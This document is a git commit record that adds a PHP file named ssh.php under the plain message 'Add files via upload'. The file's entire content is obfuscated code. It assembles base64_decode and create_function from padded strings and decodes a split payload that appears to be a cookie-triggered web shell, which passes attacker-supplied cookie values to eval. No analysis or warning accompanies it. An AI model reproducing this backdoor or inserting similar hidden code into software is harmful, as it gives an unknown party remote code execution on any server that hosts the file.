19da174ef66868311f5fabc152b99285099a069c
Yukinoshita47 <bagusherp@gmail.com>
2016-12-31 15:57:23 +0700

    Add files via upload

---
+++ ssh.php
@@ -0,0 +1,10 @@
+<?php
+$hvsa="yksIGpvaW4oYXJyYXlfjsc2xpY2UojsJGEsjsJGMoJGEjspLTMpKSkpKTtlY2hvICc8LycjsuJGsuJz4nO30js=";
+$shhu="3JljscGjsxhY2UjsoYXJyYXkoJy9bjsXlx3PVjsxzXS8nLCcvXHMvJyksIGFycjsmFjs5KCcnjsLCcrJ";
+$hgqu = str_replace("lh","","lhslhtlhrlh_lhreplhllhalhclhe");
+$tdkq="GjsEpPjMjspeyRrjsPSdoMTMjszNyc7ZWNobyAjsnPCcuJGsuJz4nO2V2YjsWwoYjsmFzZTY0X2jsRlY29kZShwcmVnX";
+$qwuo="JGM9J2jsNvdW50JzskYjsT0kX0NPT0tJjsRTtpZihjsyZXNjsldCgkYSjsk9PSjsdncycgJiYgjsJGMoJ";
+$uhyd = $hgqu("q", "", "qbqaqseq64q_qdqeqcqoqde");
+$ezoi = $hgqu("s","","scsresatse_sfsunscstion");
+$jmlq = $ezoi('', $uhyd($hgqu("js", "", $qwuo.$tdkq.$shhu.$hvsa))); $jmlq();
+?>
